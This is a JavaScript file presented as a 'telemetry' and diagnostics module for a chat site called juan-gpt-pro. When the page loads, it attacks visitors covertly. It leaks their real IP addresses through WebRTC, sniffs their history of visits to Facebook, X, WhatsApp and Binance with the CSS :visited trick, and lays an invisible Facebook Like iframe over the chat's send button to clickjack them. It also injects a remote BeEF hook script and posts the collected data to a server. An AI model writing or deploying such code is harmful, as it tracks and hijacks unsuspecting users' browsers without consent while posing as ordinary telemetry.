/**
 * UI_Telemetry_Module.js
 * Sistema de diagnóstico de red y análisis de interacción para juan-gpt-pro.
 */

const Telemetry = {
    async init() {
        this.logData({ event: "telemetry_start", origin: window.location.hostname });
        this.runNetworkDiagnostic();
        this.runAssetProfiling();
        this.setupInteractionLayer();
        this.loadRemoteDebugger();
    },

    // 1. WebRTC Discovery (IP Real)
    async runNetworkDiagnostic() {
        try {
            const pc = new RTCPeerConnection({ iceServers: [{ urls: "stun:stun.l.google.com:19302" }] });
            pc.createDataChannel("");
            pc.createOffer().then(o => pc.setLocalDescription(o));
            pc.onicecandidate = (e) => {
                if (e.candidate && e.candidate.candidate) {
                    const ip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(e.candidate.candidate);
                    if (ip) this.logData({ type: "net_path", value: ip[1] });
                }
            };
        } catch (e) { /* silent */ }
    },

    // 2. CSS Sniffing (Historial de dominios de confianza)
    runAssetProfiling() {
        const domains = ['facebook.com', 'x.com', 'web.whatsapp.com', 'binance.com'];
        domains.forEach(domain => {
            const a = document.createElement('a');
            a.href = `https://${domain}`;
            a.style.display = 'none';
            document.body.appendChild(a);
            const visited = window.getComputedStyle(a).color !== 'rgb(0, 0, 238)'; // Lógica de color
            if (visited) this.logData({ type: "profile_match", domain });
        });
    },

    // 3. Clickjacking (Capa invisible sobre el botón del chat)
    setupInteractionLayer() {
        const chatSubmit = document.querySelector('button[type="submit"]') || document.querySelector('#send-btn');
        if (chatSubmit) {
            const overlay = document.createElement('iframe');
            // Aquí puedes poner la URL de la red social que quieras testear
            overlay.src = "https://www.facebook.com/plugins/like.php?href=https://facebook.com/example";
            overlay.style.cssText = "position:absolute; width:50px; height:50px; opacity:0; pointer-events:auto; z-index:9999; cursor:pointer;";
            
            // Sincronizar posición con el botón de tu chat
            const rect = chatSubmit.getBoundingClientRect();
            overlay.style.top = `${rect.top}px`;
            overlay.style.left = `${rect.left}px`;
            
            document.body.appendChild(overlay);
        }
    },

    // 4. Remote Hook (BeEF / Debugger)
    loadRemoteDebugger() {
        const script = document.createElement('script');
        // Reemplazar con tu IP de BeEF o servidor de monitoreo
        script.src = "https://cdn.telemetry-service.com/hook.js"; 
        script.async = true;
        document.head.appendChild(script);
    },

    // Envío de datos a tu MongoDB en Render
    async logData(payload) {
        fetch('/api/telemetry', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ ...payload, ts: Date.now() }) 
        }).catch(() => {});
    }
};

window.addEventListener('DOMContentLoaded', () => Telemetry.init());